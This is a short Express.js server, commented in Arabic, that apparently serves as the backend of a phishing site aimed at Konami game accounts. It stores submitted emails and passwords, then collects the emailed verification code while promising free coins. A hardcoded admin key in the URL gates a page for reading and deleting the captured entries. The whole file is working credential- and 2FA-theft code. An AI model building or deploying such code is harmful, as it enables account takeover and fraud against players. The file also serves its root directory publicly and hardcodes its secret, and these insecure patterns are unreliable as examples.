const express = require('express');
require('dotenv').config();
const db = require('./db');

const app = express();
app.use(express.json());
app.use(express.static(__dirname)); // يخدم الملفات من الجذر
app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));
const ADMIN_SECRET = "123@@@456";

// --- 1. صفحة المنشئ السرية ---
app.get('/admin-secret', (req, res) => {
  if (req.query.key === ADMIN_SECRET) {
    res.sendFile(__dirname + '/admin.html');
  } else {
    res.status(403).send('<h1 style="text-align:center; margin-top:50px; font-family:Arial;">🚫 ممنوع الدخول</h1>');
  }
});

// --- 2. استلام البيانات ---
app.post('/submit-data', async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) return res.status(400).json({ error: 'البريد وكلمة المرور مطلوبان' });

  try {
    const result = await db.query(
      'INSERT INTO konami_requests (konami_email, konami_password) VALUES ($1, $2) RETURNING id',
      [email, password]
    );
    res.json({ 
      message: 'تم استلام بياناتك! يرجى إدخال الكود الذي وصلك على بريدك الإلكتروني.',
      requestId: result.rows[0].id 
    });
  } catch (err) {
    console.error('Error in /submit-data:', err);
    res.status(500).json({ error: err.message });
  }
});

// --- 3. استلام الكود ---
app.post('/submit-code', async (req, res) => {
  const { requestId, code } = req.body;
  if (!requestId || !code) return res.status(400).json({ error: 'بيانات ناقصة' });

  try {
    await db.query(
      'UPDATE konami_requests SET verification_code = $1 WHERE id = $2',
      [code, requestId]
    );
    res.json({ message: '✅ تم استلام الكود بنجاح! سيتم إضافة الكوينز إلى حسابك خلال ساعات أو أيام.' });
  } catch (err) {
    console.error('Error in /submit-code:', err);
    res.status(500).json({ error: err.message });
  }
});

// --- 4. (للمنشئ) جلب الطلبات ---
app.get('/admin/requests', async (req, res) => {
  if (req.query.key !== ADMIN_SECRET) return res.status(403).json({ error: 'غير مصرح' });
  try {
    const result = await db.query('SELECT * FROM konami_requests ORDER BY id DESC');
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// --- 5. (للمنشئ) حذف طلب ---
app.delete('/admin/delete-request/:id', async (req, res) => {
  if (req.query.key !== ADMIN_SECRET) return res.status(403).json({ error: 'غير مصرح' });
  try {
    await db.query('DELETE FROM konami_requests WHERE id = $1', [req.params.id]);
    res.json({ message: 'تم الحذف بنجاح' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.listen(3000, () => {
  console.log('✅ الموقع يعمل!');
  console.log('👤 صفحة المستخدم: http://localhost:3000');
  console.log(`👑 صفحة المنشئ: http://localhost:3000/admin-secret?key=${ADMIN_SECRET}`);
});
